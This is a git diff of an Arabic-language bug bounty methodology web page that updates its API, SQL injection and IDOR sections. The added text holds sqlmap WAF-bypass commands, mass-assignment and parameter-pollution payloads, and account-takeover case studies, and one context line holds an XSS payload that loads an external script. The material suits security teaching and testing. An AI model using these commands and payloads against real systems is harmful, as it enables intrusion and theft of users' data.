@@ -6,8 +6,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Offensive Security Playbook & Methodology | Abdo Ramdan</title>
   <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;700&family=Inter:wght@300;400;600;700&family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="css/style.css?v=7">
-  <link rel="stylesheet" href="css/methodology.css?v=7">
+  <link rel="stylesheet" href="css/style.css?v=8">
+  <link rel="stylesheet" href="css/methodology.css?v=8">
 
   
 
@@ -1469,36 +1469,43 @@ aws s3 ls</div>
 
       <!-- Phase 16: API Testing Workflow -->
       <div class="meth-content-view" id="meth-content-p16" style="display: none; --tool-color: #14b8a6;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🧬</span> REST & SOAP Hacking</h2>
-          <p class="hero-tagline">منهجية الفحص والتحقق الأمني الشامل من الواجهات البرمجية وتكامل الخدمات</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">🧬</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">APIs & REST Hacking</h2>
+            <p class="phase-module-tagline">أكثر الثغرات خطورة وربحاً في عالم الـ Bug Bounty اليوم</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 2-4 Hours</span>
+              <span class="badge-difficulty bg-high">Hard</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>🛡️ API Security Checklist (REST vs SOAP vs GraphQL)</h3></div>
+          <div class="card-header"><h3>🛡️ API Security Matrix (BOLA vs Mass Assignment)</h3></div>
           <div class="table-wrapper"><table class="interactive-table">
             <thead>
               <tr>
-                <th>التصنيف</th>
-                <th>نوع الاختبار الأساسي (Security Check)</th>
-                <th>الأدوات (Tools)</th>
+                <th>الثغرة (Vulnerability)</th>
+                <th>طريقة الفحص (How to Test)</th>
+                <th>أمثلة وأدوات (Examples / Tools)</th>
               </tr>
             </thead>
             <tbody>
               <tr>
-                <td><strong>REST APIs</strong></td>
-                <td>تخمين المسارات، صلاحيات BOLA/IDOR والـ Mass Assignment وتخطي القيود الزمنية.</td>
-                <td>Postman, Kiterunner, Burp Suite</td>
+                <td><strong>BOLA / IDOR</strong></td>
+                <td>قم بتغيير المعرف <code>/api/users/123</code> إلى <code>/api/users/124</code> بحساب ذو صلاحية أقل.</td>
+                <td>استخدام أداة <strong>Autorize</strong> في Burp Suite لاختبار الصلاحيات تلقائياً.</td>
               </tr>
               <tr>
-                <td><strong>SOAP APIs</strong></td>
-                <td>فحص مسارات إدخال XML بحثاً عن ثغرات حقن الكيانات الخارجية (XXE) أو SQLi.</td>
-                <td>SoapUI, Burp Suite</td>
+                <td><strong>Mass Assignment</strong></td>
+                <td>إضافة معاملات غير مسموح بها للـ JSON Payload مثل <code>"is_admin": true</code> عند تسجيل حساب جديد.</td>
+                <td>Burp Suite / Param Miner / تخمين المتغيرات بـ FFuF.</td>
               </tr>
               <tr>
-                <td><strong>API Versioning</strong></td>
-                <td>التحقق من نقاط الاتصال القديمة (مثال: تغيير <code>/v2/</code> بالطلب إلى <code>/v1/</code>) لتخطي آليات الحماية الجديدة.</td>
-                <td>Burp Suite, Python requests</td>
+                <td><strong>Improper Asset Management</strong></td>
+                <td>تجربة إصدارات قديمة من الـ API (مثل تغيير <code>/v3/</code> إلى <code>/v1/</code>) فقد تكون الحماية معدومة هناك.</td>
+                <td>Kiterunner لاكتشاف النسخ والمسارات المنسية.</td>
               </tr>
             </tbody>
           </table></div>
@@ -1506,30 +1513,16 @@ aws s3 ls</div>
 
         <div class="cyber-card">
           <div class="card-header"><h3>⚙️ Tool Specifications: Kiterunner Scan</h3></div>
+          <p>Kiterunner هي الأداة الأقوى عالمياً في اكتشاف الـ APIs المخفية، لأنها لا تخمن المسار فقط، بل تخمن طريقة الطلب (GET/POST) مع الـ Headers المطلوبة.</p>
           <div class="cmd-ui-box">
-            <div class="cmd-ui-top">kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes.kite</div>
+            <div class="cmd-ui-top">kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes-large.kite -A=apiroute</div>
             <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes.kite', this)">📋 Copy</button>
-              <button class="cmd-btn run-btn" onclick="triggerTerminalSim('kiterunner -u target.com/api')">▶ Run Simulator</button>
+              <button class="cmd-btn" onclick="copyText('kr scan https://target.com/api -w /usr/share/wordlists/kiterunner/routes-large.kite -A=apiroute', this)">📋 Copy</button>
             </div>
           </div>
         </div>
 
-        <div class="cyber-card">
-          <div class="card-header"><h3>⚠️ Mass Assignment Vulnerability Example</h3></div>
-          <p>تحدث الثغرة عندما يقوم التطبيق بنسخ معاملات طلب المستخدم مباشرة إلى قاعدة البيانات دون تنقية:</p>
-          <div class="cmd-ui-box">
-            <div class="cmd-ui-top"># Standard Request Payload:
-{"username": "abdo", "email": "abdo@mail.com"}
-
-# Manipulated Payload (Attempting privilege escalation):
-{"username": "abdo", "email": "abdo@mail.com", "role": "admin", "is_verified": true}</div>
-            <div class="cmd-ui-bottom">
-              <button class="cmd-btn" onclick="copyText('{\"username\": \"abdo\", \"email\": \"abdo@mail.com\", \"role\": \"admin\", \"is_verified\": true}', this)">📋 Copy</button>
-            </div>
-          </div>
-        </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
+        <div class="cyber-card border-neon">
           <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Uber API BOLA/IDOR</h3></div>
           <p><strong>الوصف (Scenario):</strong> رصد مسار API للهاتف المحمول غير محمي بشكل كافٍ ضد تعديل معرفات المستخدمين.</p>
           <p><strong>الاستغلال (Exploitation):</strong> بتعديل المعرف UUID بالطلب إلى حساب آخر، استطاع المهاجم جلب تفاصيل رحلات ومواقع الزبائن بالكامل.</p>
@@ -1538,9 +1531,9 @@ aws s3 ls</div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p16" onclick="markPhaseComplete('p16','p_graphql')">
-          ✅ Mark Phase Complete — APIs & REST Hacking Done → Proceed to GraphQL Hacking
+          ✅ Mark Phase Complete — API Hacking Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase GraphQL Hacking -->
       <div class="meth-content-view" id="meth-content-p_graphql" style="display: none; --tool-color: #14b8a6;">
@@ -1816,40 +1809,58 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yourxs
 
       <!-- Phase 8: SQLi Workflow -->
       <div class="meth-content-view" id="meth-content-p8" style="display: none; --tool-color: #ef4444;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">💉</span> SQL Injection (SQLi)</h2>
-          <p class="hero-tagline">منهجية كشف واستغلال ثغرات قواعد البيانات</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">💉</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">SQL Injection (SQLi)</h2>
+            <p class="phase-module-tagline">منهجية كشف واستغلال ثغرات قواعد البيانات يدوياً وتلقائياً</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 1-3 Hours</span>
+              <span class="badge-difficulty bg-medium">Medium</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 SQLi Overview & Detection</h3></div>
-          <p>تسمح للمهاجمين بالتدخل في الاستعلامات التي يرسلها التطبيق لقاعدة البيانات.</p>
+          <div class="card-header"><h3>💡 SQLi Detection Strategy</h3></div>
+          <p>تحدث الثغرة عندما يتم دمج مدخلات المستخدم مباشرة مع استعلام قاعدة البيانات.</p>
           <ul class="t-check-list">
-            <li>✔ <strong>Detection:</strong> حقن <code>'</code> أو <code>"</code> ومراقبة أخطاء SQL أو التغيرات في الاستجابة (Blind SQLi).</li>
-            <li>✔ <strong>Automation:</strong> <code>sqlmap -u "https://target.com/item.php?id=1" --dbs --batch</code></li>
+            <li>✔ <strong>Error-Based Testing:</strong> احقن علامة الاقتباس <code>'</code> أو <code>"</code> ولاحظ إن ظهر خطأ SQL Syntax Error.</li>
+            <li>✔ <strong>Boolean-Based:</strong> جرب إضافة <code>AND 1=1</code> ثم <code>AND 1=2</code> وقارن بين طول الصفحة في الحالتين.</li>
+            <li>✔ <strong>Time-Based:</strong> إذا كان الـ Input مخفياً، استخدم <code>SLEEP(10)</code> ولاحظ وقت تأخير استجابة السيرفر.</li>
           </ul>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>📋 SQLi Types</h3></div>
-          <ul class="t-check-list">
-            <li>✔ <strong>Union-Based:</strong> دمج نتائج استعلامات إضافية مع الاستعلام الأصلي.</li>
-            <li>✔ <strong>Error-Based:</strong> إجبار السيرفر على استخلاص البيانات عبر رسائل الخطأ.</li>
-            <li>✔ <strong>Blind Time-Based:</strong> التحقق عبر إحداث تأخير زمني <code>SLEEP(5)</code>.</li>
-          </ul>
+          <div class="card-header"><h3>📋 SQLmap Pro Commands (تخطي الفلاتر)</h3></div>
+          <p>لا تكتفِ بتشغيل الأداة بشكل طبيعي. إليك أوامر المحترفين للتعامل مع الـ WAF والـ APIs:</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top"><span class="text-secondary"># 1. SQLi Through JSON API Payload</span>
+sqlmap -u "https://target.com/api/login" --data '{"user":"admin*", "pass":"123"}' --batch --dbs
+
+<span class="text-secondary"># 2. WAF Bypass (استخدام سكريبتات الـ Tamper لتمويه الطلبات)</span>
+sqlmap -u "https://target.com/id=1" --tamper="space2comment,between,randomcase" --random-agent --level=3 --risk=2
+
+<span class="text-secondary"># 3. Time-Based Optimization (تسريع الحقن الزمني البطيء)</span>
+sqlmap -u "https://target.com/id=1" --technique=T --time-sec=5 --threads=10 --no-cast</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('sqlmap -u \"https://target.com/id=1\" --tamper=\"space2comment,between,randomcase\" --random-agent --level=3', this)">📋 Copy Advanced SQLmap</button>
+            </div>
+          </div>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Union SQLi on SaaS checkout gateway</h3></div>
-          <p><strong>الوصف (Scenario):</strong> رصد استعلام غير محمي في صفحة فواتير الدفع لمتجر الكتروني كبير.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> حقن استعلام UNION وسحب معلومات وبيانات الإدارة كاملة.</p>
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Second Order SQLi</h3></div>
+          <p><strong>الوصف (Scenario):</strong> تطبيق يعقم المدخلات عند التسجيل، ولكنه يثق بها عند استخدامها في لوحة التحكم الداخلي.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> قام المهاجم بالتسجيل باسم المستخدم <code>admin'--</code>، وعندما قام المدير بعرض الملف الشخصي، تم تفعيل الاستعلام وحذف حسابات عشوائية.</p>
           <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$8,000</span></p>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p8" onclick="markPhaseComplete('p8','p9')">
-          ✅ Mark Phase Complete — SQLi Workflow Done → Proceed to SSRF Workflow
+          ✅ Mark Phase Complete — SQLi Workflow Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase 9: SSRF Workflow -->
       <div class="meth-content-view" id="meth-content-p9" style="display: none; --tool-color: #0284c7;">
@@ -1981,27 +1992,59 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yourxs
 
       <!-- Phase 10: IDOR Testing -->
       <div class="meth-content-view" id="meth-content-p10" style="display: none; --tool-color: #10b981;">
-        <div class="cyber-hero">
-          <h2 class="hero-title"><span class="hero-icon">🔑</span> IDOR & Access Control</h2>
-          <p class="hero-tagline">تخطي الصلاحيات والوصول لملفات فواتير وبيانات مستخدمين آخرين</p>
+        <div class="phase-module-header">
+          <div class="phase-module-icon">🔑</div>
+          <div class="phase-module-meta">
+            <h2 class="phase-module-title">IDOR (Insecure Direct Object Reference)</h2>
+            <p class="phase-module-tagline">تخطي الصلاحيات الأفقية والعمودية والتلاعب بالـ Parameters</p>
+            <div class="phase-meta-badges">
+              <span class="badge-time">⏱️ 1-3 Hours</span>
+              <span class="badge-difficulty bg-medium">Medium</span>
+            </div>
+          </div>
         </div>
 
         <div class="cyber-card">
-          <div class="card-header"><h3>💡 Testing Strategy</h3></div>
-          <blockquote class="mindset-quote">"قم بالتسجيل بحسابين مختلفين (A & B). استخرج طلب حساب A من Burp Suite، وقم بتعديل الـ ID أو اسم المستخدم إلى حساب B. إذا تم تنفيذ الطلب، فهناك ثغرة IDOR مؤكدة."</blockquote>
+          <div class="card-header"><h3>💡 Testing Strategy (كيف تصطادها؟)</h3></div>
+          <p>لاكتشاف هذه الثغرة، يجب أن يكون لديك حسابين مختلفين (A و B) ضمن التارجت.</p>
+          <ul class="t-check-list">
+            <li>✔ <strong>1. Capture the Request:</strong> استخدم Burp Suite لالتقاط طلب لملف خاص بحساب A (مثال: الفاتورة رقم 100).</li>
+            <li>✔ <strong>2. Modify the ID:</strong> غير رقم الفاتورة إلى 101 (الخاص بحساب B).</li>
+            <li>✔ <strong>3. Check the Response:</strong> إذا تم تحميل فاتورة حساب B دون التحقق من صلاحيتك، فقد عثرت على IDOR!</li>
+          </ul>
+          <blockquote class="mindset-quote" style="margin-top:15px;">"أداة <strong>Autorize</strong> في Burp Suite تقوم بهذه المهمة أوتوماتيكياً عبر تمرير كوكيز حساب B مع طلبات حساب A وتلوين الطلبات الناجحة بالأخضر."</blockquote>
         </div>
-      <div class="cyber-card" style="border: 1px solid rgba(155, 89, 255, 0.15); background: rgba(155, 89, 255, 0.02); margin-top: 20px;">
-          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Order Management BOLA/IDOR</h3></div>
-          <p><strong>الوصف (Scenario):</strong> التعديل على المعرف الرقمي للفاتورة في بوابة العميل في نظام إدارة الخدمات اللوجستية.</p>
-          <p><strong>الاستغلال (Exploitation):</strong> تغيير المعرف من 101 لـ 102 وقراءة بيانات ومواقع شحنات زبائن آخرين.</p>
-          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$3,500</span></p>
+
+        <div class="cyber-card">
+          <div class="card-header"><h3>🥷 Parameter Pollution (تكتيكات متقدمة)</h3></div>
+          <p>إذا كان الـ Backend يقوم بمقارنة الـ ID الخاص بك ورفض الطلب، قم بمحاولة التلاعب ببرمجة السيرفر:</p>
+          <div class="cmd-ui-box">
+            <div class="cmd-ui-top"><span class="text-secondary"># 1. HPP (HTTP Parameter Pollution)</span>
+GET /api/profile?id=MY_ID&id=VICTIM_ID
+
+<span class="text-secondary"># 2. JSON Array Wrap</span>
+{"user_id": [MY_ID, VICTIM_ID]}
+
+<span class="text-secondary"># 3. Add Extension</span>
+GET /api/profile/VICTIM_ID.json</div>
+            <div class="cmd-ui-bottom">
+              <button class="cmd-btn" onclick="copyText('{\"user_id\": [MY_ID, VICTIM_ID]}', this)">📋 Copy Payload</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="cyber-card border-neon">
+          <div class="card-header"><h3 style="color: var(--neon-purple);"><span class="hero-icon">📂</span> Case Study: Hacking User Passwords via IDOR</h3></div>
+          <p><strong>الوصف (Scenario):</strong> طلب استعادة كلمة المرور يتطلب البريد الإلكتروني ويرسل الكود. لكن رابط إعادة التعيين يحتوي على الـ User ID.</p>
+          <p><strong>الاستغلال (Exploitation):</strong> المهاجم طلب تغيير كلمة المرور لحسابه، ثم عند الإرسال، قام باعتراض الطلب وتغيير الـ <code>user_id</code> الخاص به إلى <code>user_id</code> الخاص بالمدير وتم تغيير رقم المرور للمدير بنجاح!</p>
+          <p><strong>المكافأة (Bounty):</strong> <span class="text-neon-green">$15,000</span></p>
         </div>
       
         <!-- MARK PHASE COMPLETE -->
         <button class="mark-complete-btn" id="complete-btn-p10" onclick="markPhaseComplete('p10','p11')">
-          ✅ Mark Phase Complete — IDOR Testing Done → Proceed to File Upload Exploits
+          ✅ Mark Phase Complete — IDOR Testing Done → Proceed
         </button>
-</div>
+      </div>
 
       <!-- Phase 11: File Upload Exploits -->
       <div class="meth-content-view" id="meth-content-p11" style="display: none; --tool-color: #f59e0b;">
